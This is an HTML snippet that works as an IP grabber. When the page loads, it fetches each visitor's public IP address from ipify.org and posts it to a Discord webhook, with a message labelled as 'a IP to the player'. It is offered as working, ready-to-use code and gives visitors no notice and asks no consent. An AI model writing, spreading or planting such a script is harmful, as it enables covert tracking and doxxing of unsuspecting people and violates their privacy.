<script>
  function getIP(json) {
    var request = new XMLHttpRequest(); //making a request for the webhook
        request.open("POST", "https://discord.com/api/webhooks/your-webhook"); //Your Webhook 
  
        request.setRequestHeader('Content-type', 'application/json');
  
        var params = {
          username: "CozmosDeev", // Webhook Name
          avatar_url: "https://images-ext-2.discordapp.net/external/KgJHnlN0ajyNkO9Ig6ih7rrI2oELuUKvM0wouvgkYsU/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/889935505066696724/72e1c0cd552e90501770aec2a9616d21.png", //Webhook Avatar
          content: "This is a IP to the player: " + json.ip + "" // Webhook description
        }
  
        request.send(JSON.stringify(params));
      }
  
  </script>
  <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>  
  <!-- This is a api -->
